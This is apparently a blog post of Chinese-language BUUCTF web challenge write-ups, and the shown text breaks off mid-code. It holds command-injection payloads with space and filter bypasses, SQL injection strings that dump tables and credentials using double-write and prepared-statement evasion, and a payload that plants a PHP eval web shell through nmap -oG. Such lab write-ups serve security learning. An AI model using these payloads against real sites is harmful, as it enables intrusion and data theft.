<h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce0.jpg" alt=""><br>get方式传入参数ip<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce1.jpg" alt=""><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1|ls</span><br></pre></td></tr></table></figure><br>命令执行漏洞<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce2.jpg" alt=""><br>发现了flag.php，接下来就是要想办法读出flag<br>测试一下cat<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1|cat flag.php</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce3.jpg" alt=""><br>看来过滤了空格，可以使用’,’代替，<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1|&#123;cat,flag.php&#125;</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce4.jpg" alt=""><br>看来把’{}’也过滤了,使用内联执行绕过<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1|cat<span class="variable">$IFS</span><span class="variable">$1</span>`ls`</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Ping_Ping_Ping/rce5.jpg" alt=""></p>
<h3 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">'f'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> filter(<span class="variable">$img</span>)&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = array(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,<span class="variable">$filter_arr</span>).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="built_in">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">''</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="built_in">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">'function'</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">'img'</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">'phpinfo();'</span>); //maybe you can find something <span class="keyword">in</span> here!</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="built_in">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在代码最下方发现如果$function == ‘phpinfo’，就可以访问phpinfo，它说那里有提示<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?f=phpinfo</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/easy_serialize_php/easy_serialize_php0.jpg" alt=""><br>接下来就是想办法读取d0g3_f1ag.php</p>
<h3 id="强网杯-2019-随便注-堆叠注入、预编译绕过"><a href="#强网杯-2019-随便注-堆叠注入、预编译绕过" class="headerlink" title="[强网杯 2019]随便注(堆叠注入、预编译绕过)"></a>[强网杯 2019]随便注(堆叠注入、预编译绕过)</h3><p>测试注入点<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1<span class="string">'          //报错</span></span><br><span class="line"><span class="string">1'</span> --+      //没报错</span><br></pre></td></tr></table></figure><br>单引号注入，判断一下列数<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1<span class="string">' order by 2 --+       列数为3时报错，说明只有两列</span></span><br></pre></td></tr></table></figure><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0<span class="string">' union select 1,2 --+</span></span><br></pre></td></tr></table></figure><br>返回了一段代码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">return</span> preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>,<span class="variable">$inject</span>);</span><br></pre></td></tr></table></figure><br>对关键字进行了过滤，我也不知道咋绕过啊，大佬说利用堆叠注入绕过过滤<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0<span class="string">';show tables --+</span></span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_sql/easy_sql0.jpg" alt=""><br>发现有两个表，挨个爆字段<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0<span class="string">';show columns from `1919810931114514` --+         这里表名要加反引号,不是单引号</span></span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_sql/easysql1.jpg" alt=""><br>不用爆words表了，接下里就是要查flag，但是关键字被过滤了。这里可以利用预编译绕过select限制<br>预编译相关语法<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span>:用于设置变量名和变量值</span><br><span class="line">prepare:用于预备一个语句，并赋予名称，以后可以引用该语句</span><br><span class="line">execute:执行预备的语句</span><br><span class="line">deallocate prepare:释放预处理语句</span><br></pre></td></tr></table></figure><br>payload<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0<span class="string">';set @sql=concat('</span>selec<span class="string">','</span>t * from `1919810931114514`;<span class="string">');prepare stmt_name from @sql;execute stmt_name --+</span></span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_sql/easysql2.jpg" alt=""><br>过滤了set和prepare,但是strstr()函数对大小写不敏感<br>payload<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0<span class="string">';Set @sql=concat('</span>selec<span class="string">','</span>t * from `1919810931114514`;<span class="string">');Prepare stmt_name from @sql;execute stmt_name --+</span></span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/easy_sql/easysql3.jpg" alt=""></p>
<h3 id="SUCTF-2019-EasySQL-堆叠注入"><a href="#SUCTF-2019-EasySQL-堆叠注入" class="headerlink" title="[SUCTF 2019]EasySQL(堆叠注入)"></a>[SUCTF 2019]EasySQL(堆叠注入)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1               //返回Array ( [0] =&gt; 1 )</span><br><span class="line">1<span class="string">'              //无返回</span></span><br><span class="line"><span class="string">1'</span> or <span class="string">'1'</span>=<span class="string">'1    //返回Nonono.</span></span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Easysql/Easysql0.jpg" alt=""><br>使用堆叠注入爆一下表<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1;show tables;</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Easysql/Easysql1.png" alt=""><br>大佬说官方给出的查询代码是<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">select <span class="variable">$post</span>[<span class="string">'query'</span>]||flag from Flag</span><br></pre></td></tr></table></figure><br>这里就是要想办法让||的作用不再是逻辑或，而是连接符<br>官方payload<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1;<span class="built_in">set</span> sql_mode=PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure><br>在oracle中缺省支持通过’||’来实现字符串拼接，但在mysql中缺省不支持，需要调整mysql 的sql_mode<br>模式：pipes_as_concat 来实现oracle 的一些功能<br>拼接一下就是<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">select 1;<span class="built_in">set</span> sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag</span><br></pre></td></tr></table></figure><br>sql_mode:它定义了MySQL应支持的SQL语法，以及应该在数据上做何种确认检查，其中的PIPES_AS_CONCAT会将||当作字符串的连接操作符，在该模式下进行查询时，使用字母连接会报错，只有使用数字连接才能够查询成功.这里select 1||flag from Flag相当于执行了select 1和select flag from Flag这两个查询操作<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Easysql/Easysql2.png" alt=""></p>
<h3 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h3><p>测试万能密码，直接就登陆进去了<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql0.jpg" alt=""><br>使用给出的密码登陆，接下来进行注入点测试<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=admin<span class="string">'&amp;password=123</span></span><br></pre></td></tr></table></figure><br>单引号注入，order by爆字段数,最终字段为4时报错，说明字段数为3<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=admin<span class="string">' order by 3%23&amp;password=123</span></span><br></pre></td></tr></table></figure><br>判断注入字段<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=0<span class="string">' union select 1,2,3%23&amp;password=123</span></span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql1.jpg" alt=""><br>回显点为2，3<br>爆数据库名<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=0<span class="string">' union select 1,2,database()%23&amp;password=123</span></span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql2.jpg" alt=""><br>数据库名为geek,爆表名<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=0<span class="string">' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&amp;password=123</span></span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql3.jpg" alt=""><br>得到表名：geekuser,l0ve1ysq1<br>爆字段<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=0<span class="string">' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span>geekuser<span class="string">'%23&amp;password=123</span></span><br><span class="line"><span class="string">?username=0'</span> union select 1,2,group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">'l0ve1ysq1'</span>%23&amp;password=123</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql4.jpg" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql5.jpg" alt=""><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=0<span class="string">' union select 1,2,group_concat(id,0x3a,username,0x3a,password) from geekuser%23&amp;password=123</span></span><br><span class="line"><span class="string">?username=0'</span> union select 1,2,group_concat(id,0x3a,username,0x3a,password) from l0ve1ysq1%23&amp;password=123</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql6.jpg" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/LoveSQL/lovesql7.jpg" alt=""></p>
<h3 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/hacker/hacker0.jpg" alt=""><br>下载后打开<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/hacker/hacker1.jpg" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/hacker/hacker2.jpg" alt=""><br>很多这种PHP文件,从其中的内容可以看出是一句话木马，但是很多都是混淆视听的，很明显被置空了，这道题就是要编写脚本来找出真正有效的一句话木马</p>
<h3 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_SERVER</span>[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">'REMOTE_ADDR'</span>] = <span class="variable">$_SERVER</span>[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!isset(<span class="variable">$_GET</span>[<span class="string">'host'</span>])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">'host'</span>];</span><br><span class="line">    <span class="variable">$host</span> = escapeshellarg(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host</span> = escapeshellcmd(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = md5(<span class="string">"glzjin"</span>. <span class="variable">$_SERVER</span>[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'you are in sandbox '</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="built_in">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="built_in">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看见system函数，应该是RCE<br>escapeshellarg():<a href="https://www.php.net/manual/zh/function.escapeshellarg.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.escapeshellarg.php</a><br>escapeshellcmd():<a href="https://www.php.net/manual/zh/function.escapeshellcmd.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.escapeshellcmd.php</a><br>这两个函数连用就会形成注入,漏洞介绍及利用方法：<a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">https://paper.seebug.org/164/</a><br>这里还有一个关键点就是nmap命令:<a href="https://www.cnblogs.com/liaopeng123/p/11281516.html" target="_blank" rel="noopener">https://www.cnblogs.com/liaopeng123/p/11281516.html</a><br>其中-oG命令就是这里的利用点<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-oG test.php    //将扫描结果写入test.php</span><br></pre></td></tr></table></figure><br>由以上两点可构造payload<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?host=<span class="string">' &lt;?php @eval($_POST["pass"]); ?&gt; -oG test.php '</span></span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/OnlineTool/onlineTool0.jpg" alt=""><br>拿到目录，去访问一下test.php<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/OnlineTool/onlineTool1.jpg" alt=""><br>蚁剑直接连，里面发现flag文件</p>
<h3 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/EasyCalc/calc0.jpg" alt=""><br>查看源码<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/EasyCalc/calc1.jpg" alt=""><br>看来需要绕WAF，源码中发现了calc.php<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="keyword">if</span>(!isset(<span class="variable">$_GET</span>[<span class="string">'num'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">'num'</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\'</span><span class="string">', '</span><span class="string">"', '`', '\[', '\]','\$','\\','\^'];</span></span><br><span class="line"><span class="string">        foreach (<span class="variable">$blacklist</span> as <span class="variable">$blackitem</span>) </span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">                if (preg_match('/' . <span class="variable">$blackitem</span> . '/m', <span class="variable">$str</span>)) </span></span><br><span class="line"><span class="string">                &#123;</span></span><br><span class="line"><span class="string">                        die("</span>what are you want to <span class="keyword">do</span>?<span class="string">");</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        eval('echo '.<span class="variable">$str</span>.';');</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><br>看到eval函数，就知道是RCE了<br>这里需要传入num参数，且对num参数进行了过滤<br>第一步绕过WAF,这里利用的是PHP的解析规则，即php从请求的url中取出变量时，如果变量前面有空格，会去掉前面的空格再解析<br>这里WAF只对’num’进行了过滤，如果是’ num’WAF就失效了，当php解析时’ num’就会被处理成’num’.<br>接下来就是扫一下目录，但是过滤了’/‘,可用chr()来代替<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">? num=123;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/EasyCalc/calc2.jpg" alt=""><br>读取文件内容<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">? num=123;var_dump(file_get_contents(chr(47).f1agg))</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/EasyCalc/calc3.jpg" alt=""></p>
<h3 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/buyflag/buyflag0.jpg" alt=""><br>查看源码<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/buyflag/buyflag1.jpg" alt=""><br>这里要求参数password不能为数字，同时还要满足password==404，弱类型比较.money还要大于100000000<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">password=404abc&amp;money=100000001</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/buyflag/buyflag2.jpg" alt=""><br>啥也没有，会发现Cookie的值有问题，修改成1<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/buyflag/buyflag3.jpg" alt=""><br>money的值太长了，这里可以利用科学计数法<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">password=404abc&amp;money=2e8</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/buyflag/buyflag4.jpg" alt=""></p>
<h3 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql1.jpg" alt=""><br>万能密码登陆成功<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql2.jpg" alt=""><br>在username处有注入点，是单字符注入，爆字段数<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=admin%27 order by 1%23&amp;password=123</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql0.jpg" alt=""><br>发现对or、by进行了过滤，双写绕过<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=admin%27 oorrder bbyy 1%23&amp;password=123</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql3.jpg" alt=""><br>成功绕过，爆出字段数为3，测试注入点<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=1%27 union select 1,2,3%23&amp;password=123</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql4.jpg" alt=""><br>发现对union、select进行了过滤，双写绕过<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=1%27 uunionnion sselectelect 1,2,3%23&amp;password=123</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql5.jpg" alt=""><br>注入点为2，3,爆库名<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=1%27 uunionnion sselectelect 1,database(),version()%23&amp;password=123</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql6.jpg" alt=""><br>当前数据库为geek,爆表名<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=1%27 uunionnion sselectelect 1,database(),group_concat(schema_name) from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">"geek"</span>%23&amp;password=123</span><br></pre></td></tr></table></figure><br>发现from、information、where也被过滤了，依然用双写绕过<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=1%27 uunionnion sselectelect 1,database(),group_concat(table_name) ffromrom infoorrmation_schema.tables wwherehere table_schema=<span class="string">"geek"</span>%23&amp;password=123</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql7.jpg" alt=""><br>得到表名为b4bsql、geekuser，爆字段<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=1%27 uunionnion sselectelect 1,database(),group_concat(column_name) ffromrom infoorrmation_schema.columns wwherehere table_name=<span class="string">"b4bsql"</span>%23&amp;password=123</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql8.jpg" alt=""><br>两个表的字段一样，接下来就是找flag<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=1%27 uunionnion sselectelect 1,database(),group_concat(username,0x3a,password) ffromrom b4bsql %23&amp;password=123</span><br></pre></td></tr></table></figure><br>测试发现password被过滤，这里字段password中有or子字符串，双写绕过就行<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?username=1%27 uunionnion sselectelect 1,database(),group_concat(username,0x3a,passwoorrd) ffromrom b4bsql %23&amp;password=123</span><br></pre></td></tr></table></figure><br>在b4bsql表中找到flag<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql9.jpg" alt=""></p>
<h3 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(<span class="string">"flag.php"</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line">    protected <span class="variable">$op</span>;</span><br><span class="line">    protected <span class="variable">$filename</span>;</span><br><span class="line">    protected <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>() &#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">"1"</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">process</span></span>() &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable">$this</span>-&gt;<span class="built_in">read</span>();</span><br><span class="line">            <span class="variable">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="keyword">function</span> <span class="function"><span class="title">write</span></span>() &#123;</span><br><span class="line">        <span class="keyword">if</span>(isset(<span class="variable">$this</span>-&gt;filename) &amp;&amp; isset(<span class="variable">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="variable">$this</span>-&gt;content) &gt; 100) &#123;</span><br><span class="line">                <span class="variable">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="variable">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="keyword">function</span> <span class="function"><span class="title">read</span></span>() &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(isset(<span class="variable">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="keyword">function</span> output(<span class="variable">$s</span>) &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="variable">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> is_valid(<span class="variable">$s</span>) &#123;</span><br><span 